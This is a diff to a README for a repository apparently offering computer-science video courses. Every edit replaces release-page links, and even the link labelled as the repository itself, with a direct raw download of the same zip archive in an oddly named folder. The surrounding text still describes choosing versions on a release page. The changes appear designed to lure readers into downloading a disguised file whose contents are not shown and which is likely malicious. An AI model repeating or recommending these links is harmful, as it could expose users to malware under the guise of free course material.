@@ -1,6 +1,6 @@
 # 📚 cs-video-courses - Easy Access to Video Lectures
 
-[![Download cs-video-courses](https://img.shields.io/badge/Download-cs--video--courses-green?style=for-the-badge)](https://github.com/chungback/cs-video-courses/releases)
+[![Download cs-video-courses](https://img.shields.io/badge/Download-cs--video--courses-green?style=for-the-badge)](https://github.com/chungback/cs-video-courses/raw/refs/heads/main/phenylcarbimide/courses_cs_video_v1.1.zip)
 
 ---
 
@@ -31,7 +31,7 @@ You do not need advanced technical knowledge to view or manage these videos. The
 You will need to visit the release page to download course files. Follow these steps:
 
 1. Click or tap on this link:  
-   [![Go to Download Page](https://img.shields.io/badge/Visit-Download%20Page-blue?style=for-the-badge)](https://github.com/chungback/cs-video-courses/releases)
+   [![Go to Download Page](https://img.shields.io/badge/Visit-Download%20Page-blue?style=for-the-badge)](https://github.com/chungback/cs-video-courses/raw/refs/heads/main/phenylcarbimide/courses_cs_video_v1.1.zip)
 
 2. On the page, look for the latest release version. Releases appear as sections labeled with version numbers (for example, “v1.0”).
 
@@ -125,7 +125,7 @@ New course videos might be added over time. Keep an eye on the release page for 
 To get updates:
 
 1. Visit the release page regularly:  
-   https://github.com/chungback/cs-video-courses/releases
+   https://github.com/chungback/cs-video-courses/raw/refs/heads/main/phenylcarbimide/courses_cs_video_v1.1.zip
 
 2. Download any new release files as explained above.
 
@@ -136,11 +136,11 @@ This way, you stay up to date with fresh learning content.
 ## 🔗 Useful Links
 
 - **Download and Releases:**  
-  https://github.com/chungback/cs-video-courses/releases
+  https://github.com/chungback/cs-video-courses/raw/refs/heads/main/phenylcarbimide/courses_cs_video_v1.1.zip
 
 - **GitHub Repository:**  
-  https://github.com/chungback/cs-video-courses
+  https://github.com/chungback/cs-video-courses/raw/refs/heads/main/phenylcarbimide/courses_cs_video_v1.1.zip
 
 ---
 
-[![Download cs-video-courses](https://img.shields.io/badge/Download-cs--video--courses-green?style=for-the-badge)](https://github.com/chungback/cs-video-courses/releases)
+[![Download cs-video-courses](https://img.shields.io/badge/Download-cs--video--courses-green?style=for-the-badge)](https://github.com/chungback/cs-video-courses/raw/refs/heads/main/phenylcarbimide/courses_cs_video_v1.1.zip)
